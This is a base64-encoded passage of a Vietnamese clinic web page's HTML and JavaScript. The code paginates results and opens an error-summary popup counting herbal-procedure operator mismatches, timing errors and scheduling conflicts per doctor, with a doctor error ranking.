hZ2UsICdUcmFuZyBzYXUnKTsNCiAgICBodG1sICs9IGJ0bignQ3Xhu5FpIMK7JywgbWF4UGFnZSwgREJfUEFHRT09PW1heFBhZ2UsICdUcmFuZyBjdeG7kWknKTsNCg0KICAgIHBhZ2VCdG5zLmlubmVySFRNTCA9IGh0bWw7DQogIH0NCg0KICBpZihwYWdlSW5mbyl7DQogICAgcGFnZUluZm8udGV4dENvbnRlbnQgPSBgVHJhbmcgJHtEQl9QQUdFfS8ke21heFBhZ2V9IOKAoiAke3N0YXJ0SWR4KzF9LSR7ZW5kSWR4fS8ke3RvdGFsfWA7DQogIH0NCn0NCg0KLy8gR+G6r24gc+G7sSBraeG7h24gxJHhu5VpIHBhZ2Ugc2l6ZSAoY2jhu4kgY+G6p24gZ+G7jWkgMSBs4bqnbiBzYXUga2hpIHBvcHVwIG3hu58pDQpmdW5jdGlvbiBhdHRhY2hQYWdlckV2ZW50c09uY2UoKXsNCiAgY29uc3Qgc2VsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlU2l6ZScpOw0KICBpZihzZWwgJiYgIXNlbC5kYXRhc2V0LmJvdW5kKXsNCiAgICBzZWwuZGF0YXNldC5ib3VuZCA9ICcxJzsNCiAgICBzZWwuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZSA9PiBzZXRQYWdlU2l6ZShlLnRhcmdldC52YWx1ZSkpOw0KICB9DQp9DQo8L3NjcmlwdD4NCg0KDQo8IS0tIFBPUFVQIFTDk00gVOG6rlQgTOG7lkkgLS0+DQo8ZGl2IGlkPSJzdW1tYXJ5TW9kYWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDt6LWluZGV4OjExMDUwIj4NCiAgPGRpdiBpZD0ic3VtbWFyeUJhY2tkcm9wIiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSI+PC9kaXY+DQogIDxkaXYgcm9sZT0iZGlhbG9nIiBhcmlhLW1vZGFsPSJ0cnVlIg0KICAgICAgIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTt0b3A6NiU7bGVmdDo1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTUwJSk7DQogICAgICAgICAgICAgIHdpZHRoOm1pbig5MDBweCw5MnZ3KTttYXgtaGVpZ2h0Ojg2dmg7b3ZlcmZsb3c6YXV0bzsNCiAgICAgICAgICAgICAgYmFja2dyb3VuZDojZmZmO2NvbG9yOiMwMDA7Ym9yZGVyLXJhZGl1czoxMHB4O2JvcmRlcjoycHggc29saWQgIzM0OThkYjsNCiAgICAgICAgICAgICAgYm94LXNoYWRvdzowIDhweCAyNHB4IHJnYmEoMCwwLDAsLjI1KTtmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmIj4NCiAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3BhZGRpbmc6MTRweCAxNnB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNlNWU3ZWIiPg0KICAgICAgPGgzIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MThweCI+VMOzbSBU4bqvdCBM4buXaTwvaDM+DQogICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIHR5cGU9ImJ1dHRvbiIgaWQ9InN1bW1hcnlDbG9zZUJ0biI+xJDDs25nPC9idXR0b24+DQogICAgPC9kaXY+DQogICAgPGRpdiBpZD0ic3VtbWFyeUNvbnRlbnQiIHN0eWxlPSJwYWRkaW5nOjE2cHggMThweDtmb250LXNpemU6MTRweDtsaW5lLWhlaWdodDoxLjUiPjwvZGl2Pg0KICA8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCi8vID09PT09IFTDk00gVOG6rlQgTOG7lkkgKFPhuq9jIHRodeG7kWMgLyBTYWkgdGjhu51pIGdpYW4gLyBUcsO5bmcgZ2nhu50pID09PT09DQooZnVuY3Rpb24oKXsNCiAgLy8gQ2h14bqpbiBob8OhIHTDqm4gaGnhu4NuIHRo4buLDQogIGZ1bmN0aW9uIGNsZWFuKHMpeyByZXR1cm4gKHN8fCcnKS50b1N0cmluZygpLnJlcGxhY2UoLywvZywnJykucmVwbGFjZSgvXHMrL2csJyAnKS50cmltKCk7IH0NCg0KICAvLyBHb20gbmjDs206IHsgW2RvY3Rvcl06IHsgdG90YWw6IG51bWJlciwgYnlPcGVyYXRvcjogTWFwPG9wLCBjb3VudD4gfSB9DQogIGZ1bmN0aW9uIG1ha2VCdWNrZXQoKXsgcmV0dXJuIHsgdG90YWw6MCwgYnlPcGVyYXRvcjpuZXcgTWFwKCkgfTsgfQ0KIGZ1bmN0aW9uIGJ1bXAoYnVja2V0TWFwLCBkb2N0b3IsIG9wZXJhdG9yKXsNCiAgY29uc3QgZCA9IChkb2N0b3J8fCcnKS50b1N0cmluZygpLnJlcGxhY2UoLywvZywnJykudHJpbSgpIHx8ICdLaMO0bmcgY8OzJzsNCiAgY29uc3QgbyA9IChvcGVyYXRvcnx8JycpLnRvU3RyaW5nKCkucmVwbGFjZSgvLC9nLCcnKS50cmltKCkgfHwgJ0tow7RuZyBjw7MnOw0KICBpZighYnVja2V0TWFwLmhhcyhkKSkgYnVja2V0TWFwLnNldChkLCB7IHRvdGFsOjAsIGJ5T3BlcmF0b3I6bmV3IE1hcCgpIH0pOw0KICBjb25zdCBiID0gYnVja2V0TWFwLmdldChkKTsNCiAgYi50b3RhbCsrOw0KICBiLmJ5T3BlcmF0b3Iuc2V0KG8sIChiLmJ5T3BlcmF0b3IuZ2V0KG8pfHwwKSsxKTsNCn0NCg0KICAvLyAxKSDEkOG6v20gU+G6rkMgVEhV4buQQyBUSEFORw0KZnVuY3Rpb24gY291bnRIZXJiKCl7DQogIGNvbnN0IGhlcmJzID0gQXJyYXkuaXNBcnJheSh3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMpID8gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzIDogW107DQogIGNvbnN0IG5vcm0gPSBzID0+IChzfHwnJykudG9TdHJpbmcoKS5yZXBsYWNlKC9bLO+8jF0rXHMqJC8sJycpLnJlcGxhY2UoL1xzKy9nLCcgJykudHJpbSgpLnRvTG93ZXJDYXNlKCk7DQoNCiAgLy8gMSkgxJDhur9tIHThuqduIHN14bqldCBuZ8aw4budaSB0aOG7sWMgaGnhu4duIHRoZW8gdOG7q25nIG5nw6B5DQogIGNvbnN0IGJ5RGF0ZSA9IE9iamVjdC5jcmVhdGUobnVsbCk7DQogIGhlcmJzLmZvckVhY2goaD0+ew0KICAgIGNvbnN0IGQgPSBoLmRhdGU7DQogICAgY29uc3Qgb3AgPSBub3JtKGgub3BlcmF0b3IpOw0KICAgIGlmKCFvcCB8fCBvcCA9PT0gJ2tow7RuZyBjw7MnKSByZXR1cm47ICAgICAgICAgICAgLy8gYuG7jyB0cuG7kW5nL2tow7RuZyBjw7MNCiAgICAoYnlEYXRlW2RdfHwoYnlEYXRlW2RdPU9iamVjdC5jcmVhdGUobnVsbCkpKVtvcF0gPSAoYnlEYXRlW2RdW29wXXx8MCkgKyAxOw0KICB9KTsNCg0KICAvLyAyKSBUw61uaCAixJFhIHPhu5EiICh0b3AgcGjhuqNpIGzhu5tuIGjGoW4gc2Vjb25kKQ0KICBjb25zdCBtYWpvcml0eSA9IE9iamVjdC5jcmVhdGUobnVsbCk7DQogIE9iamVjdC5rZXlzKGJ5RGF0ZSkuZm9yRWFjaChkPT57DQogICAgY29uc3QgYXJyID0gT2JqZWN0LmVudHJpZXMoYnlEYXRlW2RdKS5zb3J0KChhLGIpPT5iWzFdLWFbMV0pOw0KICAgIGNvbnN0IHRvcCAgICA9IGFyclswXSB8fCBbbnVsbCwwXTsNCiAgICBjb25zdCBzZWNvbmQgPSBhcnJbMV0gfHwgW251bGwsMF07DQogICAgbWFqb3JpdHlbZF0gPSB7IHRvcDogdG9wWzBdLCB0b3BDb3VudDogdG9wWzFdLCBzZWNvbmRDb3VudDogc2Vjb25kWzFdIH07DQogIH0pOw0KDQogIC8vIDMpIENo4buJIGPhu5luZyBuaOG7r25nIGNhIEtIw4FDIMSQQSBT4buQLCBnb20gdGhlbyBCw6FjIHPEqSBjaOG7iSDEkeG7i25oIChjw6J5IGNow61uaCkNCiAgY29uc3QgbWFwID0gbmV3IE1hcCgpOyAvLyB7IGRvY3RvciA9PiB7dG90YWwsIGJ5T3BlcmF0b3J9IH0gIChieU9wZXJhdG9yIHPhur0ga2jDtG5nIGhp4buDbiB0aOG7iykNCiAgaGVyYnMuZm9yRWFjaChoPT57DQogICAgY29uc3QgZCA9IGguZGF0ZTsNCiAgICBjb25zdCBvcCA9IG5vcm0oaC5vcGVyYXRvcik7DQogICAgaWYoIW9wIHx8IG9wID09PSAna2jDtG5nIGPDsycpIHJldHVybjsNCiAgICBjb25zdCBtID0gbWFqb3JpdHlbZF07DQogICAgaWYoIW0pIHJldHVybjsNCiAgICBpZihtLnRvcCAmJiBtLnRvcENvdW50ID4gbS5zZWNvbmRDb3VudCAmJiBvcCAhPT0gbS50b3Apew0KICAgICAgLy8gY2jhu4kgdMOtbmggdGhlbyBiw6FjIHPEqSBjaOG7iSDEkeG7i25oIChjw6J5IGNow61uaCkNCiAgICAgIGJ1bXAobWFwLCBoLmRvY3RvciwgJycpOyAgLy8gJ2J5T3BlcmF0b3InIHPhur0gYuG7iyDhuqluIOG7nyBwaOG6p24gcmVuZGVyDQogICAgfQ0KICB9KTsNCg0KICByZXR1cm4gbWFwOw0KfQ0KDQogIC8vIDIpIMSQ4bq/bSBTQUkgVEjhu5xJIEdJQU4gKG3hu41pIGzhu5dpIHRyb25nIGVycm9yTG9nIGNvaSBsw6AgbOG7l2kgdGjhu51pIGdpYW4pDQogZnVuY3Rpb24gY291bnRUaW1lRXJyb3JzKCl7DQogIGNvbnN0IG1hcCA9IG5ldyBNYXAoKTsNCg0KICAvLyBM4bqleSB04burIG3huqNuZyBlcnJvckxvZyAoa2nhu4N1IGxldCB0b8OgbiBj4bulYykNCiAgY29uc3QgbGlzdCA9DQogICAgKHR5cGVvZiBlcnJvckxvZyAhPT0gJ3VuZGVmaW5lZCcgJiYgQXJyYXkuaXNBcnJheShlcnJvckxvZykpID8gZXJyb3JMb2cgOg0KICAgIChBcnJheS5pc0FycmF5KHdpbmRvdy5lcnJvckxvZykgPyB3aW5kb3cuZXJyb3JMb2cgOiBbXSk7DQoNCiAgLy8gQ2jhu4kgbOG6pXkgbOG7l2kgbOG7h2NoIHRo4budaSBsxrDhu6NuZyAoY8OzIGV4cGVjdGVkL2FjdHVhbCkNCiAgbGlzdC5mb3JFYWNoKGUgPT4gew0KICAgIGNvbnN0IGQgPSBlICYmIGUuZGV0YWlsczsNCiAgICBpZiAoIWQpIHJldHVybjsNCiAgICBpZiAodHlwZW9mIGQuZXhwZWN0ZWQgPT09ICdudW1iZXInICYmIHR5cGVvZiBkLmFjdHVhbCA9PT0gJ251bWJlcicpIHsNCiAgICAgIGJ1bXAobWFwLCBkLmRvY3RvciwgZC5vcGVyYXRvcik7DQogICAgfQ0KICB9KTsNCg0KICAvLyBGYWxsYmFjazogxJHhu41jIHRy4buxYyB0aeG6v3AgdOG7qyBi4bqjbmcgbOG7l2kgdGjhu51pIGdpYW4gbuG6v3UgdsOsIGzDvSBkbyBuw6BvIMSRw7MgbeG6o25nIHLhu5duZw0KICBpZiAobWFwLnNpemUgPT09IDApIHsNCiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcjZXJyb3JMb2cgdHIuZXJyb3Itcm93JykuZm9yRWFjaCh0ciA9PiB7DQogICAgICBjb25zdCB0ZHMgPSB0ci5xdWVyeVNlbGVjdG9yQWxsKCd0ZCcpOw0KICAgICAgLy8gQuG6o25nIGPDsyBj4buZdDogVMOqbiBCTiB8IFRo4bunIHRodeG6rXQgfCBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCB8IE5nxrDhu51pIHRo4buxYyBoaeG7h24gfCBUaOG7nWkgZ2lhbiB8IEzhu5dpDQogICAgICBjb25zdCBkb2N0b3IgICA9IHRkc1syXT8udGV4dENvbnRlbnQ/LnRyaW0oKTsNCiAgICAgIGNvbnN0IG9wZXJhdG9yID0gdGRzWzNdPy50ZXh0Q29udGVudD8udHJpbSgpOw0KICAgICAgaWYgKGRvY3RvciB8fCBvcGVyYXRvcikgYnVtcChtYXAsIGRvY3Rvciwgb3BlcmF0b3IpOw0KICAgIH0pOw0KICB9DQoNCiAgcmV0dXJuIG1hcDsNCn0NCg0KICAvLyAzKSDEkOG6v20gVFLDmU5HIEdJ4bucICh04burIGFsbFByb2NlZHVyZXMuY29uZmxpY3Q9dHJ1ZSkNCmZ1bmN0aW9uIGNvdW50Q29uZmxpY3RzKCl7DQogIGNvbnN0IGxpc3QgPQ0KICAgICh0eXBlb2YgYWxsUHJvY2VkdXJlcyAhPT0gJ3VuZGVmaW5lZCcgJiYgQXJyYXkuaXNBcnJheShhbGxQcm9jZWR1cmVzKSkgPyBhbGxQcm9jZWR1cmVzIDoNCiAgICAoQXJyYXkuaXNBcnJheSh3aW5kb3cuYWxsUHJvY2VkdXJlcykgPyB3aW5kb3cuYWxsUHJvY2VkdXJlcyA6IFtdKTsNCiAgY29uc3QgbWFwID0gbmV3IE1hcCgpOw0KICBsaXN0LmZvckVhY2gocCA9PiB7DQogICAgaWYgKHAgJiYgcC5jb25mbGljdCkgYnVtcChtYXAsIHAuZG9jdG9yLCBwLm9wZXJhdG9yKTsNCiAgfSk7DQogIHJldHVybiBtYXA7DQp9DQpmdW5jdGlvbiBidWlsZERvY3RvclJhbmtpbmcoaGVyYk1hcCwgdGltZU1hcCwgY29uZk1hcCl7DQogIGNvbnN0IHRvdGFsTWFwID0gbmV3IE1hcCgpOw0KDQogIC8vIGfhu5lwIHPhu5EgdOG7qyAzIG1hcA0KICBjb25zdCBtZXJnZSA9IChzcmMpID0+IHsNCiAgICBzcmMuZm9yRWFjaCgoaW5mbywgZG9jKT0+ew0KICAgICAgaWYoIXRvdGFsTWFwLmhhcyhkb2MpKSB0b3RhbE1hcC5zZXQoZG9jLHt0b3RhbDowfSk7DQogICAgICB0b3RhbE1hcC5nZXQoZG9jKS50b3RhbCArPSBpbmZvLnRvdGFsOw0KICAgIH0pOw0KICB9Ow0KICBtZXJnZShoZXJiTWFwKTsgbWVyZ2UodGltZU1hcCk7IG1lcmdlKGNvbmZNYXApOw0KDQogIC8vIHNvcnQgZ2nhuqNtIGThuqduDQogIGNvbnN0IGFyciA9IEFycmF5LmZyb20odG90YWxNYXAuZW50cmllcygpKS5zb3J0KChhLGIpPT5iWzFdLnRvdGFsIC0gYVsxXS50b3RhbCk7DQoNCiAgbGV0IGh0bWwgPSBgPGRpdiBjbGFzcz0ic2VjdGlvbiI+PGRpdiBjbGFzcz0iaW5uZXIiPmA7DQogIGlmKGFyci5sZW5ndGg9PT0wKXsNCiAgICBodG1sICs9IGA8ZGl2IGNsYXNzPSJub3RlLWVtcHR5Ij5DaMawYSBjw7MgZOG7ryBsaeG7h3U8L2Rpdj5gOw0KICB9IGVsc2Ugew0KICAgIGh0bWwgKz0gYDx0YWJsZSBjbGFzcz0idGFibGUtY2xlYW4iPjx0aGVhZD48dHI+DQogICAgICAgICAgICAgIDx0aD5I4bqhbmc8L3RoPjx0aD5Cw6FjIHPEqTwvdGg+DQogICAgICAgICAgICAgIDx0aCBjbGFzcz0icmlnaHQiPlThu5VuZyBs4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPjwvdGhlYWQ+PHRib2R5PmA7DQogICAgYXJyLmZvckVhY2goKFtkb2MsaW5mb10saSk9PnsNCiAgICAgIGh0bWwgKz0gYDx0cj4NCiAgICAgICAgPHRkPiR7aSsxfTwvdGQ+DQogICAgICAgIDx0ZD48Yj4ke2RvY308L2I+PC90ZD4NCiAgICAgICAgPHRkIGNsYXNzPSJyaWdodCI+JHtpbmZvLnRvdGFsfTwvdGQ+DQogICAgICA8L3RyPmA7DQogICAgfSk7DQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogIH0NCiAgaHRtbCArPSBgPC9kaXY+PC9kaXY+YDsNCiAgcmV0dXJuIGh0bWw7DQp9DQogIC8vIFJlbmRlciAxIHNlY3Rpb24NCmZ1bmN0aW9uIHJlbmRlclNlY3Rpb24odGl0bGUsIG1hcCwgc2hvd09wZXJhdG9ycyA9IHRydWUpew0KICBpZighbWFwIHx8IG1hcC5zaXplPT09MCl7DQogICAgcmV0dXJuIGA8aDQgc3R5bGU9Im1hcmdpbjoxMHB4IDAgNnB4Ij4ke3RpdGxlfTwvaDQ+PGRpdj48aT5DaMawYSBjw7MgZOG7ryBsaeG7h3U8L2k+PC9kaXY+YDsNCiAgfQ0KICBjb25zdCBkb2N0b3JzID0gQXJyYXkuZnJvbShtYXAuZW50cmllcygpKS5zb3J0KChhLGIpPT5iWzFdLnRvdGFsIC0gYVsxXS50b3RhbCk7DQoNCiAgbGV0IGh0bWwgPSBgPGg0IHN0eWxlPSJtYXJnaW46MTBweCAwIDZweCI+JHt0aXRsZX08L2g0PjxkaXYgc3R5bGU9ImJvcmRlcjoxcHggc29saWQgI2VlZTtib3JkZXItcmFkaXVzOjhweDtwYWRkaW5nOjEycHgiPmA7DQogIGRvY3RvcnMuZm9yRWFjaCgoW2RvY3RvciwgaW5mb10pPT57DQogICAgaHRtbCArPSBgPGRpdiBzdHlsZT0ibWFyZ2luLWJvdHRvbToxMHB4Ij4NCiAgICAgIDxkaXY+QsOhYyBzxKkgPGI+JHtkb2N0b3J9OjwvYj4gJHtpbmZvLnRvdGFsfTwvZGl2PmA7DQogICAgaWYgKHNob3dPcGVyYXRvcnMpew0KICAgICAgY29uc3Qgb3BzID0gQXJyYXkuZnJvbShpbmZvLmJ5T3BlcmF0b3IuZW50cmllcygpKS5zb3J0KChhLGIpPT5iWzFdLWFbMV0pOw0KICAgICAgaWYob3BzLmxlbmd0aCl7DQogICAgICAgIGh0bWwgKz0gYDxkaXYgc3R5bGU9Im1hcmdpbi1sZWZ0OjEycHg7bWFyZ2luLXRvcDo0cHgiPmAgKw0KICAgICAgICAgICAgICAgIG9wcy5tYXAoKFtvcCxjXSkgPT4gYC0gJHtvcH06ICR7Y31gKS5qb2luKCc8YnI+JykgKw0KICAgICAgICAgICAgICAgIGA8L2Rpdj5gOw0KICAgICAgfQ0KICAgIH0NCiAgICBodG1sICs9IGA8L2Rpdj5gOw0KICB9KTsNCiAgaHRtbCArPSBgPC9kaXY+YDsNCiAgcmV0dXJuIGh0bWw7DQp9DQoNCiAgZnVuY3Rpb24gYnVpbGRTdW1tYXJ5SFRNTCgpew0KICAgIGNvbnN0IGhlcmJNYXAgPSBjb3VudEhlcmIoKTsNCiAgICBjb25zdCB0aW1lTWFwID0gY291bnRUaW1lRXJyb3JzKCk7DQogICAgY29uc3QgY29uZk1hcCA9IGNvdW50Q29uZmxpY3RzKCk7DQoNCiAgICAvLyBU4buVbmcgbmhhbmggKGTDsm5nIMSR4bqndSkNCiAgICBjb25zdCBoZXJiVG90YWwgPSBBcnJheS5mcm9tKGhlcmJNYXAudmFsdWVzKCkpLnJlZHVjZSgocyxiKT0+cytiLnRvdGFsLDApOw0KICAgIGNvbnN0IHRpbWVUb3RhbCA9IEFycmF5LmZyb20odGltZU1hcC52YWx1ZXMoKSkucmVkdWNlKChzLGIpPT5zK2IudG90YWwsMCk7DQogICAgY29uc3QgY29uZlRvdGFsID0gQXJyYXkuZnJvbShjb25mTWFwLnZhbHVlcygpKS5yZWR1Y2UoKHMsYik9PnMrYi50b3RhbCwwKTsNCg0KICAgIGxldCB0b3AgPSBgIDxkaXYgY2xhc3M9InN1bW1hcnktd3JhcCI+DQogICAgICA8ZGl2IGNsYXNzPSJrcGktZ3JpZCI+DQogICAgICAgIDxkaXYgY2xhc3M9ImtwaS1jYXJkIGtwaS1ibHVlIj4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJrcGktdGl0bGUiPjxpIGNsYXNzPSJmYS1zb2xpZCBmYS1tb3J0YXItcGVzdGxlIj48L2k+IFPhuq9jIHRodeG7kWMgdGhhbmc8L2Rpdj4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJrcGktdmFsdWUiPiR7aGVyYlRvdGFsfTwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPGRpdiBjbGFzcz0ia3BpLWNhcmQga3BpLWFtYmVyIj4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJrcGktdGl0bGUiPjxpIGNsYXNzPSJmYS1yZWd1bGFyIGZhLWNsb2NrIj48L2k+IFNhaSB0aOG7nWkgZ2lhbjwvZGl2Pg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS12YWx1ZSI+JHt0aW1lVG90YWx9PC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJrcGktY2FyZCBrcGktcmVkIj4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJrcGktdGl0bGUiPjxpIGNsYXNzPSJmYS1zb2xpZCBmYS10cmlhbmdsZS1leGNsYW1hdGlvbiI+PC9pPiBUcsO5bmcgZ2nhu508L2Rpdj4NCiAgICAgICAgICA8ZGl2IGNsYXNzPSJrcGktdmFsdWUiPiR7Y29uZlRvdGFsfTwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICAgIDwvZGl2PmA7DQoNCiAgICByZXR1cm4gdG9wDQogICAgICArIHJlbmRlclNlY3Rpb24oJ1Phuq9jIHRodeG7kWMgdGhhbmcnLCBoZXJiTWFwLCAvKnNob3dPcGVyYXRvcnMqLyBmYWxzZSkgDQogICAgICArICc8YnIvPicNCiAgICAgICsgcmVuZGVyU2VjdGlvbignU2FpIHRo4budaSBnaWFuJywgdGltZU1hcCkNCiAgICAgICsgJzxici8+Jw0KICAgICAgKyByZW5kZXJTZWN0aW9uKCdUcsO5bmcgZ2nhu50nLCBjb25mTWFwKTsNCiAgfQ0KDQogIC8vIE3hu58vxJHDs25nIG1vZGFsDQogIHdpbmRvdy5vcGVuRXJyb3JTdW1tYXJ5ID0gZnVuY3Rpb24oKXsNCiAgICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdW1tYXJ5TW9kYWwnKTsNCiAgICBjb25zdCBjb250ZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlDb250ZW50Jyk7DQogICAgaWYoIW1vZGFsIHx8ICFjb250ZW50KSByZXR1cm47DQovLyBs4bqleSAzIG1hcCDEkeG7gyB0cnV54buBbiBjaG8gYuG6o25nIHjhur9wIGjhuqFuZw0KY29uc3QgaGVyYk1hcCA9IGNvdW50SGVyYigpOw0KY29uc3QgdGltZU1hcCA9IGNvdW50VGltZUVycm9ycygpOw0KY29uc3QgY29uZk1hcCA9IGNvdW50Q29uZmxpY3RzKCk7DQoNCi8vIG7hu5lpIGR1bmcgcG9wdXAgPSBwaOG6p24gdMOzbSB04bqvdCBjxakgKyBi4bqjbmcgeOG6v3AgaOG6oW5nIGLDoWMgc8SpDQpjb250ZW50LmlubmVySFRNTCA9IGJ1aWxkU3VtbWFyeUhUTUwoKQ0KICArIGJ1aWxkRG9jdG9yUmFua2luZyhoZXJiTWFwLCB0aW1lTWFwLCBjb25mTWFwKTsNCiAgICBtb2RhbC5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgfTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlDbG9zZUJ0bicpPy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdW1tYXJ5TW9kYWwnKS5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgfSk7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdW1tYXJ5QmFja2Ryb3AnKT8uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKT0+IHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeU1vZGFsJykuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQogIH0pOw0KDQogIC8vIFNhdSBraGkg4oCcS2nhu4NtIFRyYeKAnSB4b25nLCBoaeG7h24gbsO6dCBUw7NtIFThuq90IEzhu5dpICh0aGVvIGPDuW5nIGPGoSBjaOG6vyBuaMawIDIgbsO6dCBraWEpDQogIC8vICjEkMOjIGPDsyBsb2dpYyBoaeG7h24gbsO6dCB0cm9uZyBzZXRUaW1lb3V0IHNhdSBhbmFseXplIOKAlCB0YSBjaOG7iSDEkeG6o20gYuG6o28gbsO6dCBuw6B5IGPFqW5nIGhp4buHbikNCiAgY29uc3Qgb3JpZyA9IHNldFRpbWVvdXQ7DQogIC8vIEtow7RuZyBj4bqnbiBob29rLCB2w6wgY29kZSBjw7MgxJFv4bqhbjoNCiAgLy8gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uLmJ0bicpLmZvckVhY2goYnRuID0+IHsNCiAgLy8gICBpZiAoYnRuLnRleHRDb250ZW50LmluY2x1ZGVzKCdHaeG7nSB0cuG7kW5nJykgfHwgYnRuLnRleHRDb250ZW50LmluY2x1ZGVzKCdT4bqvYyB0aHXhu5FjIHRoYW5nJykpIHsgYnRuLnN0eWxlLmRpc3BsYXk9J2lubGluZS1ibG9jayc7fQ0KICAvLyB9KTsNCiAgLy8gLT4gVGEgdGjDqm0gZMOybmcgZMaw4bubaSDEkeG7gyBuw7p0IG3hu5tpIGPFqW5nIMSRxrDhu6NjIGLhuq10Og0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gew0KICAgIC8vIEtoaSBwb3B1cCBsb2FkaW5nIHThuq90IHNhdSBhbmFseXplLCB0YSBi4bqtdCB0aOG7pyBjw7RuZyBu4bq/dSDEkcOjIGPDsyBk4buvIGxp4buHdToNCiAgICAvLyAoYW4gdG/DoG4gbuG6v3UgZ+G7jWkgbmhp4buBdSBs4bqnbikNCiAgICBjb25zdCBzaG93SWZEYXRhID0gKCkgPT4gew0KICAgICAgaWYgKEFycmF5LmlzQXJyYXkod2luZG93LmFsbFByb2NlZHVyZXMpICYmIHdpbmRvdy5hbGxQcm9jZWR1cmVzLmxlbmd0aCl7DQogICAgICAgIGNvbnN0IGIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTdW1tYXJ5QnRuJyk7DQogICAgICAgIGlmIChiKSBiLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgICAgIH0NCiAgICB9Ow0KICAgIC8vIGNo4bqheSBuZ2F5IHbDoCBzYXUgbeG7l2kgbOG6p24gbOG7jWMvcmVuZGVyDQogICAgc2hvd0lmRGF0YSgpOw0KICAgIC8vIGfhuq9uIHbDoG8gY8OhYyDEkWnhu4NtIMSRw6MgY8OzOg0KICAgIGNvbnN0IHJiID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsNCiAgICBjb25zdCBlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIGNvbnN0IG9icyA9IG5ldyBNdXRhdGlvbk9ic2VydmVyKHNob3dJZkRhdGEpOw0KICAgIGlmIChyYikgb2JzLm9ic2VydmUocmIsIHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTsNCiAgICBpZiAoZWwpIG9icy5vYnNlcnZlKGVsLCB7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7DQogIH0pOw0KfSkoKTsNCjwvc2NyaXB0Pg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpID0+IHsNCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU3VtbWFyeUJ0bicpOw0KICBjb25zdCBoZXJiQnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUb2dnbGVCdG4nKTsNCiAgY29uc3QgYXZhaWxCdG4gPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdidXR0b24uYnRuW29uY2xpY2s9InRvZ2dsZUF2YWlsYWJpbGl0eSgpIl0nKTsNCg0KICBmdW5jdGlvbiBzeW5jU2hvdygpew0KICAgIGlmICghYnRuKSByZXR1cm47DQogICAgY29uc3QgaGVyYlNob3duICA9IGhlcmJCdG4gJiYgZ2V0Q29tcHV0ZWRTdHlsZShoZXJiQnRuKS5kaXNwbGF5ICE9PSAnbm9uZSc7DQogICAgY29uc3QgYXZhaWxTaG93biA9IGF2YWlsQnRuICYmIGdldENvbXB1dGVkU3R5bGUoYXZhaWxCdG4pLmRpc3BsYXkgIT09ICdub25lJzsNCiAgICBpZiAoaGVyYlNob3duIHx8IGF2YWlsU2hvd24pIGJ0bi5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7DQogIH0NCg0KICAvLyBjaOG6oXkgbmdheSB2w6Aga2hpIGPDsyB0aGF5IMSR4buVaSBoaeG7g24gdGjhu4sNCiAgc3luY1N